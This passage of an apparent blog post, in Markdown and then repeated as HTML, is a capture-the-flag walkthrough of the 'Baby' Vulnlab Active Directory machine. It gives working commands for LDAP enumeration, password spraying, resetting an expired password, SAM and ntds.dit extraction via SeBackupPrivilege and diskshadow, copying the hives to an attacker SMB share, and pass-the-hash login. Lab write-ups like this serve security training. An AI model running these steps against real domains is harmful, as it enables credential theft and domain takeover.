LDIF\n#\n# LDAPv3\n# base <DC=baby,DC=vl> with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# baby.vl\ndn: DC=baby,DC=vl\n\n# Administrator, Users, baby.vl\ndn: CN=Administrator,CN=Users,DC=baby,DC=vl\n[...snip...]\n```\n\nYou can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we'd like. If we were on a Windows workstation that was within the domain, we could use tools like `ADSearch` or `PowerView` to query for any users, groups, essentially any domain object we'd like.\n\nLet's adjust our LDAP search query so we can create a user list.\n\n```Kali\n└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b \"DC=baby,DC=vl\" | grep '@baby.vl' | awk '{print $2}' | cut -d '@' -f 1 > ul.txt; cat ul.txt\n\nJacqueline.Barnett\nAshley.Webb\nHugh.George\nLeonard.Dyer\nConnor.Wilkinson\nJoseph.Hughes\nKerry.Wilson\nTeresa.Bell\n```\n\nI was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you'll see that we missed a few users. I wasn't certain if this was an LDAP issue or a `grep` issue, but nonetheless I copied the remaining users into the wordlist. (`Caroline.Robinson` and `Ian.Walker`)\n\nYou'll notice at the end of the same full LDAP dump output under `Teresa.Bell`, there seems to be a description comment that says `description: Set initial password to [...snip...`.\n\nWe can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use `crackmapexec` to test if any users have this password still set to their account. We'll use SMB as our service to test against since we really don't need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).\n\n```Kali\n└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p 'BabyStart123!'; done\n\n[...snip...]\nSMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE\n[...snip...]\n```\n\nYou'll notice that we'll get a hit on `Caroline.Robinson`, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and/or interns.\n\n# Password Reset with SMBPasswd\n\nIn that case let's try to reset their password with `smbpasswd`. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.\n\n```Kali\nsmbpasswd -r BabyDC.baby.vl -U BABYDC/'Caroline.Robinson'\n\nOld SMB password: ([...snip...])\nNew SMB password: password123@\nRetype new SMB password: password123@\nPassword changed for user Caroline.Robinson\n```\n\nIf we test the same `crackmapexec` command as above for `Caroline.Robinson`, we can see that their password was successfully updated. Normally I'd now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test `crackmapexec` against WinRM we can see that we already are able to login as this user.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Caroline.Robinson' -p 'password123@'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Caroline.Robinson:password123@ (Pwn3d!)\n```\n\nAfter logging in, you can find the user flag within the user's Desktop directory.\n\n![image1](/images/vulnlab/baby-vl/b.png \"B\")\n\n# Privilege Escalation w/ SeBackupPrivilege\n\nLet's do a quick privilege to see if there's anything that we can exploit.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> whoami /priv\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\n[...snip...]\n```\n\nYou'll see from the output that we have `SeBackupPrivilege` enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the `SAM` and `SYSTEM` databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.\n\nSo first, let's dump both of these databases into a temporary directory.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> mkdir C:\\temp\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> reg save hklm\\sam c:\\temp\\sam\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> reg save hklm\\system c:\\temp\\system\n```\n\nThese files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won't be able to set up a simple C2 server's without obfuscating our payloads, meaning we'll need to find a way to transfer our files back and forth in a inconspicuous manner.\n\nWe can use Impacket's `smbserver` to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.\n\n```Evil-WinRM -> Kali\n└─$ mkdir share/\n\n└─$ impacket-smbserver smb share/ -smb2support\n\n*Evil-WinRM* PS C:\\temp> copy sam \\\\(Kali IP)\\smb\\sam\n*Evil-WinRM* PS C:\\temp> copy system \\\\(Kali IP)\\smb\\system\n```\n\nYou'll notice a lot of output from our SMB server when we're copying the files over, this is just a built-in Impacket functionality that will dump the user's NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the `share/` directory we'll see the two files that we downloaded are in this folder.\n\nNow that we have both of these files, let's run `samdump` on them to retrieve credentials that are within these two databases.\n\n```Kali\n└─$ samdump2 system sam\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\nNow that we have the Administrator's hash, let's test the creds once more with `crackmapexec` and by passing the hash to it.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\\Administrator:[...snip...]\n```\n\nThe thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we'll need to look a little further with our `SeBackupPrivilege` to dump another file.\n\n# Diskshadow/Robocopy for NTDS.dit\n\nThe file in particular that we're looking for is a copy of the `C:\\`'s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained `SAM` and `SYSTEM` databases to dump the AD secrets of the domain controller.\n\nTo exploit this, we can use `diskshadow` and `robocopy` to create a copy of the current drive and copy the copied filesystem back to the `C:\\` drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article [here](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960).)\n\nLet's first create a file named `script.txt` and transfer it to our `Evil-WinRM` session. The contents of the script can be seen below.\n\n```diskshadow\nset metadata C:\\Windows\\Temp\\meta.cabX\nset context clientaccessibleX\nset context persistentX\nbegin backupX\nadd volume C: alias cdriveX\ncreateX\nexpose %cdrive% E:X\nend backupX\n```\n\n1. `set metadata C:\\Windows\\Temp\\meta.cabX`: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, `C:\\Windows\\Temp\\meta.cabX`.\n    \n2. `set context clientaccessibleX`: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The `X` might be a placeholder or a variable.\n    \n3. `set context persistentX`: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The `X` might be a placeholder or a variable.\n    \n4. `begin backupX`: This command is initiating the backup operation. The `X` might be a placeholder or a variable.\n    \n5. `add volume C: alias cdriveX`: This command is adding the volume `C:` to the backup operation with an alias `cdriveX`. This means that the contents of the `C:` drive will be included in the backup. The `X` might be a placeholder or a variable.\n    \n6. `createX`: This command is creating something related to the backup operation. It's not entirely clear what it's creating without more context or additional information about the script.\n    \n7. `expose %cdrive% E:X`: This command seems to be exposing the contents of the `C:` drive, which was added to the backup operation with the alias `cdriveX`, to a location specified by `%cdrive%` on drive `E:`. This might involve mounting the backup or making it accessible in some way. The `X` might be a placeholder or a variable.\n    \n8. `end backupX`: This command is ending the backup operation. The `X` might be a placeholder or a variable.\n\nLet's set up a simple Python server so we can curl this script to our WinRM session.\n\n```Kali\n└─$ python3 -m http.server 9001\n\n*Evil-WinRM* PS C:\\temp> curl http://(Kali IP):9001/script.txt -O script.txt\n```\n\nNext, let's run `diskshadow` to create a copy of the `C:\\` drive.\n\n```Evil-WinRM\ndiskshadow /s script.txt\n```\n\nAfter the filesystem copy finishes, it will be saved to `E:\\Windows`. This is where we can use `robocopy` to move it back to our `C:\\` drive.\n\n`robocopy /b E:\\Windows\\ntds . ntds.dit`\n\nLet's now use our SMB server on our Kali machine to download the `ntds.dit` file from the WinRM session.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\temp> copy ntds.dit \\\\10.8.0.173\\smb\\ntds.dit\n```\n\nFrom here, all that's left to do is retrieve the correct NTLM hashes by dumping the DC secrets with `impacket-secretsdump`.\n\n```Kali\nimpacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nThis will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you'll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.\n\nUnderneath `[*] Reading and decrypting hashes from ntds.dit`, we'll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using `crackmapexec` once more.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Administrator:[...snip...] (Pwn3d!)\n```\n\nThus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator's Desktop directory.\n\n![image2](/images/vulnlab/baby-vl/c.png \"C\")\n\n# Conclusion\n\nThis means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.\n\n# Resources\n\nhttps://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password\nhttps://github.com/BishopFox/sliver\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\n\n\n","slug":"baby-vl","published":1,"updated":"2024-06-05T20:04:33.069Z","_id":"clx0t67qs0001t5uf01d6aobz","comments":1,"layout":"post","photos":[],"content":"<p>This machine is a more beginner-level Active Directory machine, however it’s very useful if you want to understand fundamentals of AD and how to exploit it. You’ll see a lot of techniques here in more difficult machines (though they may be used differently).</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>With that, let’s run our base NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.99.70</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 987 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we’ll check out the former ports. Let’s run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.99.70 -A</span><br><span class=\"line\"></span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class=\"line\">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br></pre></td></tr></table></figure>\n\n<p>Let’s add these to our <code>/etc/hosts</code> file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.99.70 -N</span><br><span class=\"line\">Anonymous login successful</span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>SMB does not seem to be helpful as of right now, so let’s try to focus on LDAP. Normally, it’s an extremely insecure practice to allow null LDAP enumeration. That being said, there’s no harm in trying to run a few queries with LDAP to test for any responses.</p>\n<h1 id=\"LDAP-Enumeration\"><a href=\"#LDAP-Enumeration\" class=\"headerlink\" title=\"LDAP Enumeration\"></a>LDAP Enumeration</h1><p>Let’s first test for null authentication and query LDAP for all domain objects in the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># extended LDIF</span><br><span class=\"line\">#</span><br><span class=\"line\"># LDAPv3</span><br><span class=\"line\"># base &lt;DC=baby,DC=vl&gt; with scope subtree</span><br><span class=\"line\"># filter: (objectclass=*)</span><br><span class=\"line\"># requesting: ALL</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\"># baby.vl</span><br><span class=\"line\">dn: DC=baby,DC=vl</span><br><span class=\"line\"></span><br><span class=\"line\"># Administrator, Users, baby.vl</span><br><span class=\"line\">dn: CN=Administrator,CN=Users,DC=baby,DC=vl</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we’d like. If we were on a Windows workstation that was within the domain, we could use tools like <code>ADSearch</code> or <code>PowerView</code> to query for any users, groups, essentially any domain object we’d like.</p>\n<p>Let’s adjust our LDAP search query so we can create a user list.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot; | grep &#x27;@baby.vl&#x27; | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; ul.txt; cat ul.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Jacqueline.Barnett</span><br><span class=\"line\">Ashley.Webb</span><br><span class=\"line\">Hugh.George</span><br><span class=\"line\">Leonard.Dyer</span><br><span class=\"line\">Connor.Wilkinson</span><br><span class=\"line\">Joseph.Hughes</span><br><span class=\"line\">Kerry.Wilson</span><br><span class=\"line\">Teresa.Bell</span><br></pre></td></tr></table></figure>\n\n<p>I was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you’ll see that we missed a few users. I wasn’t certain if this was an LDAP issue or a <code>grep</code> issue, but nonetheless I copied the remaining users into the wordlist. (<code>Caroline.Robinson</code> and <code>Ian.Walker</code>)</p>\n<p>You’ll notice at the end of the same full LDAP dump output under <code>Teresa.Bell</code>, there seems to be a description comment that says <code>description: Set initial password to [...snip...</code>.</p>\n<p>We can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use <code>crackmapexec</code> to test if any users have this password still set to their account. We’ll use SMB as our service to test against since we really don’t need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p &#x27;BabyStart123!&#x27;; done</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">SMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice that we’ll get a hit on <code>Caroline.Robinson</code>, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and&#x2F;or interns.</p>\n<h1 id=\"Password-Reset-with-SMBPasswd\"><a href=\"#Password-Reset-with-SMBPasswd\" class=\"headerlink\" title=\"Password Reset with SMBPasswd\"></a>Password Reset with SMBPasswd</h1><p>In that case let’s try to reset their password with <code>smbpasswd</code>. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbpasswd -r BabyDC.baby.vl -U BABYDC/&#x27;Caroline.Robinson&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Old SMB password: ([...snip...])</span><br><span class=\"line\">New SMB password: password123@</span><br><span class=\"line\">Retype new SMB password: password123@</span><br><span class=\"line\">Password changed for user Caroline.Robinson</span><br></pre></td></tr></table></figure>\n\n<p>If we test the same <code>crackmapexec</code> command as above for <code>Caroline.Robinson</code>, we can see that their password was successfully updated. Normally I’d now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test <code>crackmapexec</code> against WinRM we can see that we already are able to login as this user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Caroline.Robinson&#x27; -p &#x27;password123@&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Caroline.Robinson:password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>After logging in, you can find the user flag within the user’s Desktop directory.</p>\n<p><img src=\"/images/vulnlab/baby-vl/b.png\" alt=\"image1\" title=\"B\"></p>\n<h1 id=\"Privilege-Escalation-w-SeBackupPrivilege\"><a href=\"#Privilege-Escalation-w-SeBackupPrivilege\" class=\"headerlink\" title=\"Privilege Escalation w&#x2F; SeBackupPrivilege\"></a>Privilege Escalation w&#x2F; SeBackupPrivilege</h1><p>Let’s do a quick privilege to see if there’s anything that we can exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                    State</span><br><span class=\"line\">============================= ============================== =======</span><br><span class=\"line\">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class=\"line\">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class=\"line\">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see from the output that we have <code>SeBackupPrivilege</code> enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the <code>SAM</code> and <code>SYSTEM</code> databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.</p>\n<p>So first, let’s dump both of these databases into a temporary directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; mkdir C:\\temp</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; reg save hklm\\sam c:\\temp\\sam</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; reg save hklm\\system c:\\temp\\system</span><br></pre></td></tr></table></figure>\n\n<p>These files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won’t be able to set up a simple C2 server’s without obfuscating our payloads, meaning we’ll need to find a way to transfer our files back and forth in a inconspicuous manner.</p>\n<p>We can use Impacket’s <code>smbserver</code> to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.</p>\n<figure class=\"highlight plaintext\"><figcaption><span>-> Kali</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ mkdir share/</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-smbserver smb share/ -smb2support</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy sam \\\\(Kali IP)\\smb\\sam</span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy system \\\\(Kali IP)\\smb\\system</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice a lot of output from our SMB server when we’re copying the files over, this is just a built-in Impacket functionality that will dump the user’s NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the <code>share/</code> directory we’ll see the two files that we downloaded are in this folder.</p>\n<p>Now that we have both of these files, let’s run <code>samdump</code> on them to retrieve credentials that are within these two databases.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ samdump2 system sam</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class=\"line\">*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Administrator’s hash, let’s test the creds once more with <code>crackmapexec</code> and by passing the hash to it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\\Administrator:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>The thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we’ll need to look a little further with our <code>SeBackupPrivilege</code> to dump another file.</p>\n<h1 id=\"Diskshadow-Robocopy-for-NTDS-dit\"><a href=\"#Diskshadow-Robocopy-for-NTDS-dit\" class=\"headerlink\" title=\"Diskshadow&#x2F;Robocopy for NTDS.dit\"></a>Diskshadow&#x2F;Robocopy for NTDS.dit</h1><p>The file in particular that we’re looking for is a copy of the <code>C:\\</code>‘s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained <code>SAM</code> and <code>SYSTEM</code> databases to dump the AD secrets of the domain controller.</p>\n<p>To exploit this, we can use <code>diskshadow</code> and <code>robocopy</code> to create a copy of the current drive and copy the copied filesystem back to the <code>C:\\</code> drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article <a href=\"https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\">here</a>.)</p>\n<p>Let’s first create a file named <code>script.txt</code> and transfer it to our <code>Evil-WinRM</code> session. The contents of the script can be seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set metadata C:\\Windows\\Temp\\meta.cabX</span><br><span class=\"line\">set context clientaccessibleX</span><br><span class=\"line\">set context persistentX</span><br><span class=\"line\">begin backupX</span><br><span class=\"line\">add volume C: alias cdriveX</span><br><span class=\"line\">createX</span><br><span class=\"line\">expose %cdrive% E:X</span><br><span class=\"line\">end backupX</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><p><code>set metadata C:\\Windows\\Temp\\meta.cabX</code>: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, <code>C:\\Windows\\Temp\\meta.cabX</code>.</p>\n</li>\n<li><p><code>set context clientaccessibleX</code>: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>set context persistentX</code>: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>begin backupX</code>: This command is initiating the backup operation. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>add volume C: alias cdriveX</code>: This command is adding the volume <code>C:</code> to the backup operation with an alias <code>cdriveX</code>. This means that the contents of the <code>C:</code> drive will be included in the backup. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>createX</code>: This command is creating something related to the backup operation. It’s not entirely clear what it’s creating without more context or additional information about the script.</p>\n</li>\n<li><p><code>expose %cdrive% E:X</code>: This command seems to be exposing the contents of the <code>C:</code> drive, which was added to the backup operation with the alias <code>cdriveX</code>, to a location specified by <code>%cdrive%</code> on drive <code>E:</code>. This might involve mounting the backup or making it accessible in some way. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>end backupX</code>: This command is ending the backup operation. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n</ol>\n<p>Let’s set up a simple Python server so we can curl this script to our WinRM session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 -m http.server 9001</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; curl http://(Kali IP):9001/script.txt -O script.txt</span><br></pre></td></tr></table></figure>\n\n<p>Next, let’s run <code>diskshadow</code> to create a copy of the <code>C:\\</code> drive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">diskshadow /s script.txt</span><br></pre></td></tr></table></figure>\n\n<p>After the filesystem copy finishes, it will be saved to <code>E:\\Windows</code>. This is where we can use <code>robocopy</code> to move it back to our <code>C:\\</code> drive.</p>\n<p><code>robocopy /b E:\\Windows\\ntds . ntds.dit</code></p>\n<p>Let’s now use our SMB server on our Kali machine to download the <code>ntds.dit</code> file from the WinRM session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy ntds.dit \\\\10.8.0.173\\smb\\ntds.dit</span><br></pre></td></tr></table></figure>\n\n<p>From here, all that’s left to do is retrieve the correct NTLM hashes by dumping the DC secrets with <code>impacket-secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>This will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you’ll find hashes for all of the AD users that we dumped through LDAP at the beginning of this 